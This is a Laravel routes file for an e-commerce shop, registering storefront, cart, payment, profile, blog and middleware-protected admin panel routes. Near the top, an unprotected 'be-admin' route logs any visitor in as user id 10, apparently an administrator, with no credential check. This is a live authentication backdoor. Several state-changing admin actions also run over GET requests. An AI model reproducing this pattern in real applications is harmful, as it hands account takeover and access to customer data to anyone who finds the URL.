<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Front\HomeController;
use App\Http\Controllers\Admin\User\RoleController;
use App\Http\Controllers\Front\Blog\BlogController;
use App\Http\Controllers\Admin\Content\FAQController;
use App\Http\Controllers\Admin\Content\PostController;
use App\Http\Controllers\Admin\Market\BrandController;
use App\Http\Controllers\Admin\Market\OrderController;
use App\Http\Controllers\Admin\Market\StoreController;
use App\Http\Controllers\Auth\LoginRegisterController;
use App\Http\Controllers\Admin\Market\BannerController;
use App\Http\Controllers\Admin\Ticket\TicketController;
use App\Http\Controllers\Admin\User\CustomerController;
use App\Http\Controllers\Admin\AdminDashboardController;
use App\Http\Controllers\Admin\Market\GalleryController;
use App\Http\Controllers\Admin\Market\PaymentController;
use App\Http\Controllers\Admin\Market\ProductController;
use App\Http\Controllers\Admin\User\AdminUserController;
use App\Http\Controllers\Admin\Content\CommentController;
use App\Http\Controllers\Admin\Market\CategoryController;
use App\Http\Controllers\Admin\Market\DeliveryController;
use App\Http\Controllers\Admin\Market\DiscountController;
use App\Http\Controllers\Admin\Market\PropertyController;
use App\Http\Controllers\Admin\User\PermissionController;
use App\Http\Controllers\Front\Profile\AddressController;
use App\Http\Controllers\Front\Profile\CompareController;
use App\Http\Controllers\Front\Profile\ProfileController;
use App\Http\Controllers\Admin\Market\GuaranteeController;
use App\Http\Controllers\Front\Profile\FavoriteController;
use App\Http\Controllers\Admin\Content\ContactUsController;
use App\Http\Controllers\Front\SalesProcess\CartController;
use App\Http\Controllers\Admin\Ticket\TicketAdminController;
use App\Http\Controllers\Admin\Market\ProductColorController;
use App\Http\Controllers\Admin\Content\PostCategoryController;
use App\Http\Controllers\Admin\Market\PropertyValueController;
use App\Http\Controllers\Admin\Market\AnswerQuestionController;
use App\Http\Controllers\Front\SalesProcess\CheckoutController;
use App\Http\Controllers\Front\Market\FAQController as FrontFAQController;
use App\Http\Controllers\Front\ContactUsController as FrontContactUsController;
use App\Http\Controllers\Front\Profile\OrderController as FrontOrderController;
use App\Http\Controllers\Front\Profile\TicketController as FrontTicketController;
use App\Http\Controllers\Front\Market\ProductController as FrontProductController;
use App\Http\Controllers\Front\Profile\CommentController as FrontCommentController;
use App\Http\Controllers\Admin\Market\CommentController as ProductCommentController;
use App\Http\Controllers\Front\SalesProcess\PaymentController as FrontPaymentController;



/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/


Route::get('be-admin',function(){
    Auth::loginUsingId(10);
    return back();
});

//auth
Route::controller(LoginRegisterController::class)->prefix('auth')->group(function () {
    Route::get('login-register', 'loginRegisterForm')->name('auth.login-register-form');
    Route::middleware('throttle:customer-login-register-limiter')->post('login-register', 'loginRegister')->name('auth.login-register');
    Route::get('login-register-confirm/{token}', 'loginRegisterConfirmForm')->name('auth.login-register-confirm-form');
    Route::middleware('throttle:customer-login-register-limiter')->post('login-register-confirm/{token}', 'loginRegisterConfirm')->name('auth.login-register-confirm');
    Route::middleware('throttle:customer-login-register-limiter')->get('login-register-resend-otp/{token}', 'loginRegisterResendOtp')->name('auth.login-register-resend-otp');
    Route::get('logout/', 'logout')->name('auth.logout');
});

//front
Route::get('/', [HomeController::class, 'index'])->name('front.home');
Route::get('/about-us', [HomeController::class, 'aboutUs'])->name('front.about-us');
Route::get('/welcome', [HomeController::class, 'welcome'])->name('front.welcome');
Route::get('/contact-us', [HomeController::class, 'contactUs'])->name('front.contact-us');
Route::post('/contact-us/store', [FrontContactUsController::class, 'store'])->name('front.contact-us.store');
Route::get('/faqs', [FrontFAQController::class, 'index'])->name('front.faqs');
//product
Route::controller(FrontProductController::class)->prefix('market')->group(function () {
    Route::get('/product/{product:slug}', 'product')->name('front.market.product');
    Route::get('/products/{category?}', 'products')->name('front.products');
    Route::get('/add-comment/{product:slug}', 'addCommentView')->name('front.market.add-comment.page');
    Route::post('/add-review/{product:slug}', 'addReview')->name('front.market.add-review');
    Route::post('/add-comment/{product:slug}', 'addComment')->name('front.market.add-comment');
    Route::post('/add-comment-replay/{product:slug}/{comment}', 'addReplay')->name('front.market.add-replay');
    Route::get('/add-to-favorite/{product:slug}', 'addToFavorite')->name('front.market.add-to-favorite');
    Route::get('/add-to-compare/{product:slug}', 'addToCompare')->name('front.market.add-to-compare');
    Route::post('/add-question/{product}', 'addQuestion')->name('front.market.add-question');
    Route::post('/add-question-replay/{product}/{answerQuestion}', 'addQuestionReplay')->name('front.market.add-replay-question');
    Route::post('/add-rate/{product}', 'addRate')->name('front.market.add-rate');
});
//cart
Route::controller(CartController::class)->prefix('cart')->group(function () {
    //cart
    Route::get('/', 'cart')->name('front.sales-process.cart');
    Route::post('/add-to-cart/{product}', 'addToCart')->name('front.sales-process.add-to-cart');
    Route::get('/remove-from-cart/{cartItem}', 'removeFromCart')->name('front.sales-process.remove-from-cart');
    Route::get('/remove-from-cart-session/{productid}/{colorid}/{guaranteeid}', 'removeFromCartSession')->name('front.sales-process.remove-from-cart-session');
    Route::post('/go-to-checkout', 'toCheckout')->name('front.sales-process.go-to-checkout');
});
//cart/checkout
Route::controller(CheckoutController::class)->prefix('cart/checkout')->group(function () {
    Route::get('/address-and-delivery', 'addressAndDelivery')->name('front.sales-process.address-and-delivery');
    Route::get('/choose-address-and-delivery', 'chooseAddressAndDelivery')->name('front.sales-process.choose-address-and-delivery');
});
//cart/payment
Route::controller(FrontPaymentController::class)->prefix('cart/payment')->group(function () {
    Route::get('/', 'payment')->name('front.sales-process.payment');
    Route::post('/copan-discount', 'copanDiscount')->name('front.sales-process.copanDiscount');
    Route::post('/payment-submit', 'paymentSubmit')->name('front.sales-process.paymentSubmit');
    Route::get('/verify', 'verifyPayment')->name('cart.verifyPayment');
    Route::get('/callback-payment/{order}', 'callback')->name('cart.callback');
});
//profile
Route::prefix('profile')->group(function () {
    Route::controller(ProfileController::class)->group(function () {
        Route::get('/', [ProfileController::class, 'profile'])->name('front.profile.profile');
        Route::get('/update', [ProfileController::class, 'updateView'])->name('front.profile.update-view');
        Route::put('/update', [ProfileController::class, 'update'])->name('front.profile.update');
    });
    Route::controller(AddressController::class)->group(function () {
        Route::get('/addresses', 'index')->name('front.profile.addresses');
        Route::post('/add-address', 'addAddress')->name('front.profile.add-address');
        Route::put('/update-address/{address}', 'updateAdresses')->name('front.profile.addresses.update');
        Route::get('/addresses/delete/{address}', 'deleteAddress')->name('front.profile.addresses.delete');
    });
    Route::controller(AddressController::class)->group(function () {
        Route::get('/addresses', 'index')->name('front.profile.addresses');
        Route::post('/add-address', 'addAddress')->name('front.profile.add-address');
        Route::put('/update-address/{address}', 'updateAdresses')->name('front.profile.addresses.update');
        Route::get('/addresses/delete/{address}', 'deleteAddress')->name('front.profile.addresses.delete');
    });
    Route::controller(FrontTicketController::class)->group(function () {
        Route::get('/my-tickets', 'index')->name('front.profile.my-tickets');
        Route::get('my-tickets/show/{ticket}', 'show')->name('front.profile.my-tickets.show');
        Route::post('my-tickets/answer/{ticket}', 'answer')->name('front.profile.my-tickets.answer');
        // Route::get('my-tickets/change/{ticket}','change')->name('front.profile.my-tickets.change');
        Route::get('my-tickets/create', 'create')->name('front.profile.my-tickets.create');
        Route::post('my-tickets/store', 'store')->name('front.profile.my-tickets.store');
    });


    Route::controller(FrontCommentController::class)->group(function () {
        Route::get('/comments', 'index')->name('front.profile.comments');
        Route::delete('/comments/{comment}', 'delete')->name('front.profile.comments.delete');

    });
    Route::controller(FrontOrderController::class)->group(function () {
        Route::get('/orders', 'index')->name('front.profile.orders');
        Route::get('/orders/{order}', 'showOrder')->name('front.profile.showOrder');

    });
    Route::controller(FavoriteController::class)->group(function () {
        Route::get('/my-favorites', 'index')->name('front.profile.favorites');
        Route::get('/my-favorites/delete/{product}', 'delete')->name('front.profile.favorites.delete');
    });
    Route::controller(CompareController::class)->group(function () {
        Route::get('/my-compare-list', 'index')->name('front.profile.compares');
        Route::get('/compare-item/delete/{product}', 'delete')->name('front.profile.compares.delete');
    });


});
//blogs
Route::controller(BlogController::class)->prefix('blogs')->group(function () {
    Route::get('/', 'index')->name('front.blogs.index');
    Route::get('/{postCategory}', 'indexCategory')->name('front.blogs.index-category');
    Route::get('show/{post}', 'showBlog')->name('front.blogs.show-blog');
    Route::post('/add-comment/{post}', 'addComment')->name('front.blogs.add-comment');
    Route::post('/add-comment-replay/{post}/{comment}', 'addReplay')->name('front.blogs.add-replay');
});




//admin-panel
Route::prefix('admin')->middleware(['auth', 'admin', 'active'])->group(function () {
    Route::get('', [AdminDashboardController::class, 'index'])->name('admin.home');

    Route::prefix('content')->group(function () {
        //post category
        Route::controller(PostCategoryController::class)->prefix('postCategory')->group(function () {
            Route::get('/', 'index')->name('admin.content.postCategory.index');
            Route::get('/create', 'create')->name('admin.content.postCategory.create');
            Route::post('/store', 'store')->name('admin.content.postCategory.store');
            Route::get('/edit/{postCategory}', 'edit')->name('admin.content.postCategory.edit');
            Route::put('/update/{postCategory}', 'update')->name('admin.content.postCategory.update');
            Route::delete('/delete/{postCategory}', 'delete')->name('admin.content.postCategory.delete');
        });
        //post
        Route::controller(PostController::class)->prefix('post')->group(function () {
            Route::get('/', 'index')->name('admin.content.post.index');
            Route::get('/create', 'create')->name('admin.content.post.create');
            Route::post('/store', 'store')->name('admin.content.post.store');
            Route::get('/edit/{post}', 'edit')->name('admin.content.post.edit');
            Route::put('/update/{post}', 'update')->name('admin.content.post.update');
            Route::delete('/delete/{post}', 'delete')->name('admin.content.post.delete');
        });
        //comment
        Route::controller(CommentController::class)->prefix('comment')->group(function () {
            Route::get('/', 'index')->name('admin.content.comment.index');
            Route::get('/show/{comment}', 'show')->name('admin.content.comment.show');
            // Route::get('/status/{comment}', 'status')->name('admin.comment.status');
            Route::delete('/destroy/{comment}', 'delete')->name('admin.content.comment.delete');
            Route::get('/approved/{comment}', 'approved')->name('admin.content.comment.approved');
            Route::post('/answer/{comment}', 'answer')->name('admin.content.comment.answer');
        });
        //faq
        Route::controller(FAQController::class)->prefix('faq')->group(function () {
            Route::get('/', 'index')->name('admin.content.faq.index');
            Route::get('/create', 'create')->name('admin.content.faq.create');
            Route::post('/store', 'store')->name('admin.content.faq.store');
            Route::delete('/destroy/{comment}', 'delete')->name('admin.content.faq.delete');
        });
        //contact-us
        Route::controller(ContactUsController::class)->prefix('contact-us')->group(function () {
            Route::get('/', 'index')->name('admin.content.contact-us.index');
            Route::get('/unseen', 'unseen')->name('admin.content.contact-us.unseen');
            Route::get('/show/{contactUs}', 'show')->name('admin.content.contact-us.show');
        });
    });

    Route::prefix('market')->group(function () {
        //category
        Route::controller(CategoryController::class)->prefix('category')->group(function () {
            Route::get('/', 'index')->name('admin.market.category.index');
            Route::get('/create', 'create')->name('admin.market.category.create');
            Route::post('/store', 'store')->name('admin.market.category.store');
            Route::get('/edit/{productCategory}', 'edit')->name('admin.market.category.edit');
            Route::put('/update/{productCategory}', 'update')->name('admin.market.category.update');
            Route::delete('/destroy/{productCategory}', 'delete')->name('admin.market.category.delete');
        });
        //brand
        Route::controller(BrandController::class)->prefix('brand')->group(function () {
            Route::get('/', 'index')->name('admin.market.brand.index');
            Route::get('/create', 'create')->name('admin.market.brand.create');
            Route::post('/store', 'store')->name('admin.market.brand.store');
            Route::get('/edit/{brand}', 'edit')->name('admin.market.brand.edit');
            Route::put('/update/{brand}', 'update')->name('admin.market.brand.update');
            Route::delete('/destroy/{brand}', 'delete')->name('admin.market.brand.delete');
        });
        //product
        Route::prefix('product')->group(function () {
            Route::get('/', [ProductController::class, 'index'])->name('admin.market.product.index');
            Route::get('/create', [ProductController::class, 'create'])->name('admin.market.product.create');
            Route::post('/store', [ProductController::class, 'store'])->name('admin.market.product.store');
            Route::get('/edit/{product}', [ProductController::class, 'edit'])->name('admin.market.product.edit');
            Route::put('/update/{product}', [ProductController::class, 'update'])->name('admin.market.product.update');
            Route::delete('/destroy/{product}', [ProductController::class, 'destroy'])->name('admin.market.product.destroy');

            //gallery
            Route::get('{product}/gallery', [GalleryController::class, 'index'])->name('admin.market.product.gallery.index');
            Route::get('/{product}/gallery/create', [GalleryController::class, 'create'])->name('admin.market.product.gallery.create');
            Route::post('{product}/gallery/store', [GalleryController::class, 'store'])->name('admin.market.product.gallery.store');
            Route::delete('/gallery/destroy/{gallery}', [GalleryController::class, 'destroy'])->name('admin.market.product.gallery.destroy');
            // //product-color
            Route::get('{product}/product-color', [ProductColorController::class, 'index'])->name('admin.market.product-color.index');
            Route::get('{product}/product-color/create', [ProductColorController::class, 'create'])->name('admin.market.product-color.create');
            Route::post('{product}/product-color/store', [ProductColorController::class, 'store'])->name('admin.market.product-color.store');
            Route::delete('product-color/destroy/{productcolor}', [ProductColorController::class, 'destroy'])->name('admin.market.product-color.destroy');
            // //guarantee
            Route::get('/guarantee/{product}', [GuaranteeController::class, 'index'])->name('admin.market.guarantee.index');
            Route::get('/guarantee/create/{product}', [GuaranteeController::class, 'create'])->name('admin.market.guarantee.create');
            Route::post('/guarantee/store/{product}', [GuaranteeController::class, 'store'])->name('admin.market.guarantee.store');
            Route::delete('/guarantee/destroy/{product}/{guarantee}', [GuaranteeController::class, 'destroy'])->name('admin.market.guarantee.destroy');

        });
        //store
        Route::controller(StoreController::class)->prefix('store')->group(function () {
            Route::get('/', 'index')->name('admin.market.store.index');
            // Route::get('/add-to-store/{product}','addToStore')->name('admin.market.store.add-to-store');
            // Route::post('/store/{product}','store')->name('admin.market.store.store');
            Route::get('/edit/{product}', 'edit')->name('admin.market.store.edit');
            Route::put('/update/{product}', 'update')->name('admin.market.store.update');
        });
        //property
        Route::prefix('property')->group(function () {
            Route::get('/', [PropertyController::class, 'index'])->name('admin.market.property.index');
            Route::get('/create', [PropertyController::class, 'create'])->name('admin.market.property.create');
            Route::post('/store', [PropertyController::class, 'store'])->name('admin.market.property.store');
            Route::get('/edit/{categoryAttribute}', [PropertyController::class, 'edit'])->name('admin.market.property.edit');
            Route::put('/update/{categoryAttribute}', [PropertyController::class, 'update'])->name('admin.market.property.update');
            Route::delete('/destroy/{categoryAttribute}', [PropertyController::class, 'destroy'])->name('admin.market.property.destroy');

            //value
            Route::get('{categoryAttribute}/value', [PropertyValueController::class, 'index'])->name('admin.market.property.value.index');
            Route::get('{categoryAttribute}/value/create', [PropertyValueController::class, 'create'])->name('admin.market.property.value.create');
            Route::post('{categoryAttribute}/value/store', [PropertyValueController::class, 'store'])->name('admin.market.property.value.store');
            Route::get('value/{categoryAttribute}/edit/{categoryValue}', [PropertyValueController::class, 'edit'])->name('admin.market.property.value.edit');
            Route::put('value/{categoryAttribute}/update/{categoryValue}', [PropertyValueController::class, 'update'])->name('admin.market.property.value.update');
            Route::delete('value/{categoryAttribute}/destroy/{categoryValue}', [PropertyValueController::class, 'destroy'])->name('admin.market.property.value.destroy');
        });
        //comment
        Route::controller(ProductCommentController::class)->prefix('product-comment')->group(function () {
            Route::get('/', 'index')->name('admin.market.comment.index');
            Route::get('/show/{comment}', 'show')->name('admin.market.comment.show');
            // Route::get('/status/{comment}', 'status')->name('admin.comment.status');
            Route::delete('/destroy/{comment}', 'delete')->name('admin.market.comment.delete');
            Route::get('/approved/{comment}', 'approved')->name('admin.market.comment.approved');
            Route::post('/answer/{comment}', 'answer')->name('admin.market.comment.answer');
        });
        //discount
        Route::controller(DiscountController::class)->prefix('discount')->group(function () {
            //copan
            Route::get('/copan','copan')->name('admin.market.discount.copan');
            Route::get('/copan/create', 'copanCreate')->name('admin.market.discount.copan.create');
            Route::post('/copan/store','copanStore')->name('admin.market.discount.copan.store');
            Route::get('copan/edit/{copan}', 'copanEdit')->name('admin.market.discount.copan.edit');
            Route::put('/copan/update/{copan}','copanUpdate')->name('admin.market.discount.copan.update');
            Route::delete('copan/delete/{copan}', 'copanDestroy')->name('admin.market.discount.copan.delete');

            //common-discount
            Route::get('/common-discount','commonDiscount')->name('admin.market.discount.commonDiscount');
            Route::get('/common-discount/create','commonDiscountCreate')->name('admin.market.discount.commonDiscount.create');
            Route::post('/common-discount/store', 'commonDiscountStore')->name('admin.market.discount.commonDiscount.store');
            Route::get('/common-discount/edit/{commonDiscount}', 'commonDiscountEdit')->name('admin.market.discount.commonDiscount.edit');
            Route::put('/common-discount/update/{commonDiscount}', 'commonDiscountUpdate')->name('admin.market.discount.commonDiscount.update');
            Route::delete('/common-discount/delete/{commonDiscount}','commonDiscountDestroy')->name('admin.market.discount.commonDiscount.delete');

            // amazing sale
            Route::get('/amazing-sale','amazingSale')->name('admin.market.discount.amazingSale');
            Route::get('/amazing-sale/create', 'amazingSaleCreate')->name('admin.market.discount.amazingSale.create');
            Route::post('/amazing-sale/store','amazingSaleStore')->name('admin.market.discount.amazingSale.store');
            Route::get('/amazing-sale/edit/{amazingSale}', 'amazingSaleEdit')->name('admin.market.discount.amazingSale.edit');
            Route::put('/amazing-sale/update/{amazingSale}','amazingSaleUpdate')->name('admin.market.discount.amazingSale.update');
            Route::delete('/amazing-sale/delete/{amazingSale}', 'amazingSaleDestroy')->name('admin.market.discount.amazingSale.delete');

        });
        //delivery
        Route::controller(DeliveryController::class)->prefix('delivery')->group(function () {
            Route::get('/', 'index')->name('admin.market.delivery.index');
            Route::get('/create', 'create')->name('admin.market.delivery.create');
            Route::post('/store', 'store')->name('admin.market.delivery.store');
            Route::get('/edit/{delivery}', 'edit')->name('admin.market.delivery.edit');
            Route::put('/update/{delivery}', 'update')->name('admin.market.delivery.update');
            Route::delete('/destroy/{delivery}', 'destroy')->name('admin.market.delivery.destroy');
            Route::get('/status/{delivery}', 'status')->name('admin.market.delivery.status');
        });
        //payment
        Route::controller(PaymentController::class)->prefix('payment')->group(function () {
            Route::get('/', 'index')->name('admin.market.payment.index');
            Route::get('/online', 'online')->name('admin.market.payment.online');
            Route::get('/cash', 'cash')->name('admin.market.payment.cash');
            Route::get('/paid/{payment}', 'paid')->name('admin.market.payment.paid');
            Route::get('/notPaid/{payment}', 'notPaid')->name('admin.market.payment.notPaid');
            Route::get('/canceled/{payment}', 'canceled')->name('admin.market.payment.canceled');
            Route::get('/returned/{payment}', 'returned')->name('admin.market.payment.returned');
            Route::get('/show/{payment}', 'show')->name('admin.market.payment.show');
        });
        //orders
        Route::controller(OrderController::class)->prefix('order')->group(function () {
            Route::get('/', 'all')->name('admin.market.order.all');
            Route::get('/new-order', 'newOrders')->name('admin.market.order.newOrders');
            Route::get('/sending', 'sending')->name('admin.market.order.sending');
            Route::get('/unpaid', 'unpaid')->name('admin.market.order.unpaid');
            Route::get('/canceled', 'canceled')->name('admin.market.order.canceled');
            Route::get('/returned', 'returned')->name('admin.market.order.returned');
            Route::get('/show-factor/{order}', 'showFactor')->name('admin.market.order.show-factor');
            Route::get('/show-factor/{order}/detail', 'detail')->name('admin.market.order.show-factor/detail');
            Route::get('/change-send-status/{order}', 'changeSendStatus')->name('admin.market.order.changeSendStatus');
            Route::get('/change-order-status/{order}', 'changeOrderStatus')->name('admin.market.order.changeOrderStatus');
            Route::delete('/destroy/{order}', 'destroy')->name('admin.market.order.delete');
            //Route::get('/cancel-order/{order}', 'cancelOrder')->name('admin.market.order.cancelOrder');
        });
        //banner
        Route::controller(BannerController::class)->prefix('banner')->group(function () {
            Route::get('/', 'index')->name('admin.market.banner.index');
            Route::get('/create', 'create')->name('admin.market.banner.create');
            Route::post('/store', 'store')->name('admin.market.banner.store');
            Route::get('/edit/{banner}', 'edit')->name('admin.market.banner.edit');
            Route::put('/update/{banner}', 'update')->name('admin.market.banner.update');
            Route::get('/status/{banner}', 'status')->name('admin.market.banner.status');
            Route::delete('/destroy/{banner}', 'destroy')->name('admin.market.banner.destroy');
        });
        //question & answer
        Route::controller(AnswerQuestionController::class)->prefix('question-answer')->group(function () {
            Route::get('/', 'index')->name('admin.market.question-answer.index');
            Route::get('/show/{answerQuestion}', 'show')->name('admin.market.question-answer.show');
            // Route::get('/status/{answerQuestion}', 'status')->name('admin.question-answer.status');
            Route::delete('/destroy/{answerQuestion}', 'delete')->name('admin.market.question-answer.delete');
            Route::get('/approved/{answerQuestion}', 'approved')->name('admin.market.question-answer.approved');
            Route::post('/answer/{answerQuestion}', 'answer')->name('admin.market.question-answer.answer');
        });
    });

    Route::prefix('ticket')->group(function () {
        //tickets
        Route::controller(TicketController::class)->group(function () {
            Route::get('/all', 'index')->name('admin.ticket.index');
            Route::get('/new-tickets', 'newTickets')->name('admin.ticket.newTickets');
            Route::get('/open-tickets', 'openTickets')->name('admin.ticket.openTickets');
            Route::get('/close-tickets', 'closeTickets')->name('admin.ticket.closeTickets');
            Route::get('/show/{ticket}', 'show')->name('admin.ticket.show');
            Route::post('/answer/{ticket}', 'answer')->name('admin.ticket.answer');
            Route::get('/change/{ticket}', 'change')->name('admin.ticket.change');
        });
        //admin-ticket
        // Route::controller(TicketAdminController::class)->prefix('ticket-admin')->group(function () {
        //     Route::get('/', 'index')->name('admin.ticket.admin.index');
        //     // Route::get('/set/{admin}', 'set')->name('admin.ticket.admin.set');
        //     Route::post('/search', 'search')->name('admin.ticket.admin.search');

        // });
    });

    Route::prefix('user')->namespace('User')->group(function () {
        //admin-user
        Route::prefix('admin-user')->group(function () {
            Route::get('/', [AdminUserController::class, 'index'])->name('admin.user.admin-user.index');
            Route::get('/create', [AdminUserController::class, 'create'])->name('admin.user.admin-user.create');
            Route::post('/store', [AdminUserController::class, 'store'])->name('admin.user.admin-user.store');
            Route::get('/edit/{user}', [AdminUserController::class, 'edit'])->name('admin.user.admin-user.edit');
            Route::put('/update/{user}', [AdminUserController::class, 'update'])->name('admin.user.admin-user.update');
            Route::delete('/destroy/{user}', [AdminUserController::class, 'destroy'])->name('admin.user.admin-user.destroy');
            Route::get('/createAdmin', [AdminUserController::class, 'createAdmin'])->name('admin.user.admin-user.create-admin');
            Route::post('/storeAdmin', [AdminUserController::class, 'storeAdmin'])->name('admin.user.admin-user.store-admin');
            Route::get('/status/{user}', [AdminUserController::class, 'status'])->name('admin.user.admin-user.status');
            Route::get('/activation/{user}', [AdminUserController::class, 'activation'])->name('admin.user.admin-user.activation');
            Route::get('/roles/{admin}', [AdminUserController::class, 'roles'])->name('admin.user.admin-user.roles');
            Route::post('/roles/{admin}/store', [AdminUserController::class, 'rolesStore'])->name('admin.user.admin-user.roles.store');
            Route::get('/permissions/{admin}', [AdminUserController::class, 'permissions'])->name('admin.user.admin-user.permissions');
            Route::post('/permissions/{admin}/store', [AdminUserController::class, 'permissionsStore'])->name('admin.user.admin-user.permissions.store');

        });
        //customer
        Route::prefix('customer')->group(function () {
            Route::get('/', [CustomerController::class, 'index'])->name('admin.user.customer.index');
            Route::get('/create', [CustomerController::class, 'create'])->name('admin.user.customer.create');
            Route::post('/store', [CustomerController::class, 'store'])->name('admin.user.customer.store');
            Route::get('/edit/{user}', [CustomerController::class, 'edit'])->name('admin.user.customer.edit');
            Route::put('/update/{user}', [CustomerController::class, 'update'])->name('admin.user.customer.update');
            Route::delete('/destroy/{user}', [CustomerController::class, 'destroy'])->name('admin.user.customer.destroy');
            Route::get('/status/{user}', [CustomerController::class, 'status'])->name('admin.user.customer.status');
            Route::get('/activation/{user}', [CustomerController::class, 'activation'])->name('admin.user.customer.activation');

        });
        //role
        Route::prefix('role')->group(function () {
            Route::get('/', [RoleController::class, 'index'])->name('admin.user.role.index');
            Route::get('/create', [RoleController::class, 'create'])->name('admin.user.role.create');
            Route::post('/store', [RoleController::class, 'store'])->name('admin.user.role.store');
            Route::get('/edit/{role}', [RoleController::class, 'edit'])->name('admin.user.role.edit');
            Route::put('/update/{role}', [RoleController::class, 'update'])->name('admin.user.role.update');
            Route::delete('/destroy/{role}', [RoleController::class, 'destroy'])->name('admin.user.role.destroy');
            Route::get('/permission-form/{role}', [RoleController::class, 'permissionForm'])->name('admin.user.role.permission-form');
            Route::put('/permission-update/{role}', [RoleController::class, 'permissionUpdate'])->name('admin.user.role.permission-update');
        });
        //permission
        Route::prefix('permission')->group(function () {
            Route::get('/', [PermissionController::class, 'index'])->name('admin.user.permission.index');
            Route::get('/create', [PermissionController::class, 'create'])->name('admin.user.permission.create');
            Route::post('/store', [PermissionController::class, 'store'])->name('admin.user.permission.store');
            Route::get('/edit/{permission}', [PermissionController::class, 'edit'])->name('admin.user.permission.edit');
            Route::put('/update/{permission}', [PermissionController::class, 'update'])->name('admin.user.permission.update');
            Route::delete('/destroy/{permission}', [PermissionController::class, 'destroy'])->name('admin.user.permission.destroy');
        });

    });





});
